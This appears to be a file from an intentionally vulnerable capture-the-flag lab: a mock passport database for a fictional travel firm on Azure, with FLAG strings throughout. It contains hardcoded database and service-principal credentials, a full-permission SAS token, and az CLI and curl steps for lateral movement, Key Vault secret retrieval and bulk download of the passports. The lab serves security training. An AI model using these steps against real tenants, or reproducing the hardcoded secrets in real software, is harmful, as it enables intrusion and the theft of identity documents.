// Passport Database - Stored in Azure Blob Storage
// ⚠️ VULNERABILITY: Passport documents accessible via public SAS token
// FLAG{passport_data_in_public_blob_storage}

const passportDatabase = [
    {
        passportId: "PASS001",
        passportNumber: "US123456789",
        documentType: "Passport",
        issuingCountry: "United States of America",
        nationality: "USA",
        employeeId: "EMP001",
        personalInfo: {
            surname: "SMITH",
            givenNames: "JOHN MICHAEL",
            sex: "M",
            dateOfBirth: "1985-03-15",
            placeOfBirth: "Boston, Massachusetts, USA",
            height: "180 cm",
            eyeColor: "Brown",
            photoUrl: "https://bluemountaintravel.blob.core.windows.net/passports/US123456789-photo.jpg"
        },
        passportDetails: {
            dateOfIssue: "2022-01-15",
            dateOfExpiry: "2032-01-14",
            authority: "U.S. Department of State",
            placeOfIssue: "New York Passport Agency"
        },
        visas: [
            {
                country: "United Kingdom",
                type: "Business Visa",
                issueDate: "2023-03-20",
                expiryDate: "2025-03-20",
                visaNumber: "UK987654321"
            },
            {
                country: "Schengen Area",
                type: "Business Visa",
                issueDate: "2023-06-10",
                expiryDate: "2025-06-10",
                visaNumber: "SCH456789123"
            }
        ],
        travelHistory: [
            { country: "UK", date: "2023-05-15", purpose: "Business" },
            { country: "France", date: "2023-08-22", purpose: "Business" },
            { country: "Japan", date: "2023-11-10", purpose: "Business" }
        ],
        storageInfo: {
            container: "passports",
            blobName: "US123456789-passport.pdf",
            // ⚠️ VULNERABILITY: Full URL with SAS token
            url: "https://bluemountaintravel.blob.core.windows.net/passports/US123456789-passport.pdf?sv=2024-11-04&ss=bfqt&srt=c&sp=rlitfx&se=2027-01-08T20:04:11Z&st=2026-01-08T11:49:11Z&spr=https,http&sig=JZuBqq36vX1MdzJv11ED2wtUfGNVWSVUZx5rThhJrH4%3D",
            scanDate: "2026-01-15T10:30:00Z"
        },
        flag: "FLAG{john_smith_passport_accessible}"
    },
    {
        passportId: "PASS002",
        passportNumber: "US234567890",
        documentType: "Passport",
        issuingCountry: "United States of America",
        nationality: "USA",
        employeeId: "EMP002",
        personalInfo: {
            surname: "JOHNSON",
            givenNames: "SARAH ELIZABETH",
            sex: "F",
            dateOfBirth: "1990-07-22",
            placeOfBirth: "Seattle, Washington, USA",
            height: "168 cm",
            eyeColor: "Blue",
            photoUrl: "https://bluemountaintravel.blob.core.windows.net/passports/US234567890-photo.jpg"
        },
        passportDetails: {
            dateOfIssue: "2021-06-10",
            dateOfExpiry: "2031-06-09",
            authority: "U.S. Department of State",
            placeOfIssue: "Chicago Passport Agency"
        },
        visas: [
            {
                country: "China",
                type: "Business Visa (M)",
                issueDate: "2023-02-15",
                expiryDate: "2025-02-15",
                visaNumber: "CN789456123"
            },
            {
                country: "UAE",
                type: "Business Visa",
                issueDate: "2023-09-05",
                expiryDate: "2026-09-05",
                visaNumber: "AE147258369"
            }
        ],
        travelHistory: [
            { country: "Dubai", date: "2023-10-12", purpose: "Business" },
            { country: "Singapore", date: "2023-12-05", purpose: "Business" }
        ],
        storageInfo: {
            container: "passports",
            blobName: "US234567890-passport.pdf",
            url: "https://bluemountaintravel.blob.core.windows.net/passports/US234567890-passport.pdf?sv=2024-11-04&ss=bfqt&srt=c&sp=rlitfx&se=2027-01-08T20:04:11Z&st=2026-01-08T11:49:11Z&spr=https,http&sig=JZuBqq36vX1MdzJv11ED2wtUfGNVWSVUZx5rThhJrH4%3D",
            scanDate: "2026-01-12T14:20:00Z"
        }
    },
    {
        passportId: "PASS003",
        passportNumber: "CN567890123",
        documentType: "Passport",
        issuingCountry: "People's Republic of China",
        nationality: "Chinese",
        employeeId: "EMP003",
        personalInfo: {
            surname: "CHEN",
            givenNames: "MICHAEL WEI",
            sex: "M",
            dateOfBirth: "1988-11-30",
            placeOfBirth: "Vancouver, BC, Canada",
            height: "175 cm",
            eyeColor: "Brown",
            photoUrl: "https://bluemountaintravel.blob.core.windows.net/passports/CN567890123-photo.jpg"
        },
        passportDetails: {
            dateOfIssue: "2020-03-10",
            dateOfExpiry: "2030-03-09",
            authority: "Ministry of Foreign Affairs",
            placeOfIssue: "San Francisco Consulate"
        },
        visas: [
            {
                country: "United States",
                type: "H-1B Work Visa",
                issueDate: "2021-09-01",
                expiryDate: "2026-09-01",
                visaNumber: "US-H1B-2021-456789"
            },
            {
                country: "Japan",
                type: "Business Visa",
                issueDate: "2023-04-10",
                expiryDate: "2025-04-10",
                visaNumber: "JP987321654"
            }
        ],
        travelHistory: [
            { country: "Japan", date: "2023-05-20", purpose: "Business" },
            { country: "South Korea", date: "2023-09-15", purpose: "Business" }
        ],
        storageInfo: {
            container: "passports",
            blobName: "CN567890123-passport.pdf",
            url: "https://bluemountaintravel.blob.core.windows.net/passports/CN567890123-passport.pdf?sv=2024-11-04&ss=bfqt&srt=c&sp=rlitfx&se=2027-01-08T20:04:11Z&st=2026-01-08T11:49:11Z&spr=https,http&sig=JZuBqq36vX1MdzJv11ED2wtUfGNVWSVUZx5rThhJrH4%3D",
            scanDate: "2026-01-10T09:15:00Z"
        }
    },
    {
        passportId: "PASS004",
        passportNumber: "GB789012345",
        documentType: "Passport",
        issuingCountry: "United Kingdom of Great Britain and Northern Ireland",
        nationality: "British",
        employeeId: "EMP004",
        personalInfo: {
            surname: "WILLIAMS",
            givenNames: "EMMA CHARLOTTE",
            sex: "F",
            dateOfBirth: "1992-05-18",
            placeOfBirth: "London, England",
            height: "165 cm",
            eyeColor: "Green",
            photoUrl: "https://bluemountaintravel.blob.core.windows.net/passports/GB789012345-photo.jpg"
        },
        passportDetails: {
            dateOfIssue: "2022-08-20",
            dateOfExpiry: "2032-08-19",
            authority: "HM Passport Office",
            placeOfIssue: "London"
        },
        visas: [
            {
                country: "United States",
                type: "B-1 Business Visa",
                issueDate: "2022-10-15",
                expiryDate: "2032-10-15",
                visaNumber: "US-B1-789456123"
            },
            {
                country: "Australia",
                type: "Business eVisitor",
                issueDate: "2023-01-20",
                expiryDate: "2026-01-20",
                visaNumber: "AU-eVisitor-456123789"
            }
        ],
        travelHistory: [
            { country: "USA", date: "2023-03-10", purpose: "Business" },
            { country: "Australia", date: "2023-07-25", purpose: "Business" },
            { country: "France", date: "2023-11-05", purpose: "Business" }
        ],
        storageInfo: {
            container: "passports",
            blobName: "GB789012345-passport.pdf",
            url: "https://bluemountaintravel.blob.core.windows.net/passports/GB789012345-passport.pdf?sv=2024-11-04&ss=bfqt&srt=c&sp=rlitfx&se=2027-01-08T20:04:11Z&st=2026-01-08T11:49:11Z&spr=https,http&sig=JZuBqq36vX1MdzJv11ED2wtUfGNVWSVUZx5rThhJrH4%3D",
            scanDate: "2026-01-18T16:45:00Z"
        }
    },
    {
        passportId: "PASS005",
        passportNumber: "MX890123456",
        documentType: "Passport",
        issuingCountry: "United Mexican States",
        nationality: "Mexican",
        employeeId: "EMP005",
        personalInfo: {
            surname: "MARTINEZ",
            givenNames: "DAVID ALEJANDRO",
            sex: "M",
            dateOfBirth: "1987-09-25",
            placeOfBirth: "Miami, Florida, USA",
            height: "178 cm",
            eyeColor: "Brown",
            photoUrl: "https://bluemountaintravel.blob.core.windows.net/passports/MX890123456-photo.jpg"
        },
        passportDetails: {
            dateOfIssue: "2021-04-05",
            dateOfExpiry: "2031-04-04",
            authority: "Secretaría de Relaciones Exteriores",
            placeOfIssue: "Consulado en Nueva York"
        },
        visas: [
            {
                country: "United States",
                type: "TN Work Visa (NAFTA)",
                issueDate: "2021-05-01",
                expiryDate: "2026-05-01",
                visaNumber: "US-TN-789654321"
            },
            {
                country: "Brazil",
                type: "Business Visa",
                issueDate: "2023-02-20",
                expiryDate: "2025-02-20",
                visaNumber: "BR456789321"
            }
        ],
        travelHistory: [
            { country: "Brazil", date: "2023-04-15", purpose: "Business" },
            { country: "Argentina", date: "2023-06-20", purpose: "Business" }
        ],
        storageInfo: {
            container: "passports",
            blobName: "MX890123456-passport.pdf",
            url: "https://bluemountaintravel.blob.core.windows.net/passports/MX890123456-passport.pdf?sv=2024-11-04&ss=bfqt&srt=c&sp=rlitfx&se=2027-01-08T20:04:11Z&st=2026-01-08T11:49:11Z&spr=https,http&sig=JZuBqq36vX1MdzJv11ED2wtUfGNVWSVUZx5rThhJrH4%3D",
            scanDate: "2026-01-08T11:30:00Z"
        }
    },
    {
        passportId: "PASS-ADMIN",
        passportNumber: "US000000001",
        documentType: "Diplomatic Passport",
        issuingCountry: "United States of America",
        nationality: "USA",
        employeeId: "ADMIN",
        personalInfo: {
            surname: "ADMINISTRATOR",
            givenNames: "SYSTEM ROOT",
            sex: "M",
            dateOfBirth: "1980-01-01",
            placeOfBirth: "Washington, D.C., USA",
            height: "185 cm",
            eyeColor: "Blue",
            photoUrl: "https://bluemountaintravel.blob.core.windows.net/passports/US000000001-photo.jpg"
        },
        passportDetails: {
            dateOfIssue: "2020-01-01",
            dateOfExpiry: "2030-01-01",
            authority: "U.S. Department of State - Diplomatic Services",
            placeOfIssue: "Washington, D.C."
        },
        visas: [],
        travelHistory: [
            { country: "All Countries", date: "Multiple", purpose: "Diplomatic Immunity" }
        ],
        storageInfo: {
            container: "passports",
            blobName: "US000000001-diplomatic.pdf",
            url: "https://bluemountaintravel.blob.core.windows.net/passports/US000000001-diplomatic.pdf?sv=2024-11-04&ss=bfqt&srt=c&sp=rlitfx&se=2027-01-08T20:04:11Z&st=2026-01-08T11:49:11Z&spr=https,http&sig=JZuBqq36vX1MdzJv11ED2wtUfGNVWSVUZx5rThhJrH4%3D",
            scanDate: "2026-01-01T00:00:00Z"
        },
        specialNotes: "DIPLOMATIC PASSPORT - FULL ACCESS",
        flag: "FLAG{admin_diplomatic_passport_exposed}"
    }
];

// ⚠️ VULNERABILITY: Passport metadata index file
const passportIndex = {
    lastUpdated: "2026-01-20T12:00:00Z",
    totalPassports: passportDatabase.length,
    storageAccount: "bluemountaintravel",
    containerName: "passports",
    // ⚠️ VULNERABILITY: SAS token with full permissions
    sasToken: "?sv=2024-11-04&ss=bfqt&srt=c&sp=rlitfx&se=2027-01-08T20:04:11Z&st=2026-01-08T11:49:11Z&spr=https,http&sig=JZuBqq36vX1MdzJv11ED2wtUfGNVWSVUZx5rThhJrH4%3D",
    containerUrl: "https://bluemountaintravel.blob.core.windows.net/passports",
    listAllUrl: "https://bluemountaintravel.blob.core.windows.net/passports?restype=container&comp=list&sv=2024-11-04&ss=bfqt&srt=c&sp=rlitfx&se=2027-01-08T20:04:11Z&st=2026-01-08T11:49:11Z&spr=https,http&sig=JZuBqq36vX1MdzJv11ED2wtUfGNVWSVUZx5rThhJrH4%3D",
    flag: "FLAG{passport_container_sas_token_exposed}",
    accessInstructions: {
        azureCLI: "az storage blob list --account-name bluemountaintravel --container-name passports --sas-token '<token>'",
        azureStorageExplorer: "Use the SAS URL to connect to the container",
        curl: "curl '<listAllUrl>'",
        downloadPassport: "curl 'https://bluemountaintravel.blob.core.windows.net/passports/<blobName>?<sasToken>' -o passport.pdf"
    },
    lateralMovement: {
        hint: "Once you have database access, query the Passports table for more information",
        sqlQuery: "SELECT * FROM Passports WHERE EmployeeId = 'ADMIN'",
        anotherHint: "Service principal credentials in app-registrations.json can access Key Vault which contains storage account keys"
    }
};

// ⚠️ VULNERABILITY: Function to access passport data
function getPassportByEmployeeId(employeeId) {
    const passport = passportDatabase.find(p => p.employeeId === employeeId);
    
    if (passport) {
        console.log('Passport found for employee:', employeeId);
        console.log(passport);
        console.log('\n📄 Download URL:', passport.storageInfo.url);
        return passport;
    } else {
        console.log('No passport found for employee:', employeeId);
        return null;
    }
}

// ⚠️ VULNERABILITY: Function to list all passport URLs
function listAllPassportUrls() {
    console.log('=== ALL PASSPORT DOWNLOAD URLS ===');
    console.log('Container URL:', passportIndex.containerUrl);
    console.log('List All (XML):', passportIndex.listAllUrl);
    console.log('\nIndividual Passports:');
    
    passportDatabase.forEach(passport => {
        console.log(`${passport.personalInfo.givenNames} ${passport.personalInfo.surname}`);
        console.log(`  Employee: ${passport.employeeId}`);
        console.log(`  Passport: ${passport.passportNumber}`);
        console.log(`  URL: ${passport.storageInfo.url}`);
        console.log('');
    });
    
    // FLAG{all_passport_urls_with_sas_tokens_logged}
    
    return passportDatabase.map(p => ({
        employee: p.employeeId,
        name: `${p.personalInfo.givenNames} ${p.personalInfo.surname}`,
        passportNumber: p.passportNumber,
        url: p.storageInfo.url
    }));
}

// ⚠️ VULNERABILITY: Simulate lateral movement from database to passports
function lateralMovementFromDatabase() {
    console.log('=== LATERAL MOVEMENT SCENARIO ===');
    console.log('');
    console.log('Step 1: You have database credentials');
    console.log('  Server: bluemountaintravel.database.windows.net');
    console.log('  Username: admin');
    console.log('  Password: P@ssw0rd123!');
    console.log('');
    console.log('Step 2: Query the database for passport references');
    console.log('  SQL: SELECT * FROM Passports');
    console.log('');
    console.log('Step 3: Database contains blob URLs with SAS tokens');
    console.log('  You can now download all passport PDFs');
    console.log('');
    console.log('Step 4: Or use service principal from app-registrations.json');
    console.log('  Application ID: a1b2c3d4-e5f6-7890-abcd-ef1234567890');
    console.log('  Secret: SuperSecret123!@#$%');
    console.log('');
    console.log('Step 5: Service principal can access Key Vault');
    console.log('  az keyvault secret show --vault-name bluemountain-kv --name StorageAccountKey');
    console.log('');
    console.log('Step 6: Storage account key gives full access to all containers');
    console.log('  Including: passports, profiles, bookings, documents');
    console.log('');
    console.log('=================================');
    console.log('FLAG{lateral_movement_database_to_storage}');
}

// ⚠️ VULNERABILITY: Simulate accessing passports via Key Vault
function accessPassportsViaKeyVault() {
    console.log('=== ACCESS PASSPORTS VIA KEY VAULT ===');
    console.log('');
    console.log('1. Use service principal to authenticate:');
    console.log('   az login --service-principal -u a1b2c3d4-e5f6-7890-abcd-ef1234567890 -p SuperSecret123!@#$% --tenant 87654321-4321-4321-4321-210987654321');
    console.log('');
    console.log('2. Retrieve storage account key from Key Vault:');
    console.log('   az keyvault secret show --vault-name bluemountain-kv --name StorageAccountKey');
    console.log('');
    console.log('3. Use storage key to access passport container:');
    console.log('   az storage blob list --account-name bluemountaintravel --account-key <key> --container-name passports');
    console.log('');
    console.log('4. Download passport files:');
    console.log('   az storage blob download --account-name bluemountaintravel --account-key <key> --container-name passports --name US123456789-passport.pdf --file passport.pdf');
    console.log('');
    console.log('=== FULL ACCESS TO ALL PASSPORT DATA ===');
    console.log('FLAG{key_vault_to_storage_lateral_movement}');
}

// Export to window
if (typeof window !== 'undefined') {
    window.passportDatabase = passportDatabase;
    window.passportIndex = passportIndex;
    window.getPassportByEmployeeId = getPassportByEmployeeId;
    window.listAllPassportUrls = listAllPassportUrls;
    window.lateralMovementFromDatabase = lateralMovementFromDatabase;
    window.accessPassportsViaKeyVault = accessPassportsViaKeyVault;
}

console.log('=== PASSPORT DATABASE LOADED ===');
console.log(`Total passports: ${passportDatabase.length}`);
console.log('Container URL:', passportIndex.containerUrl);
console.log('');
console.log('Access functions:');
console.log('  - getPassportByEmployeeId("EMP001")');
console.log('  - listAllPassportUrls()');
console.log('  - lateralMovementFromDatabase()');
console.log('  - accessPassportsViaKeyVault()');
console.log('');
console.log('⚠️ VULNERABILITY: Passports accessible via SAS token');
console.log('FLAG{passport_documents_in_public_blob_storage}');
console.log('================================');
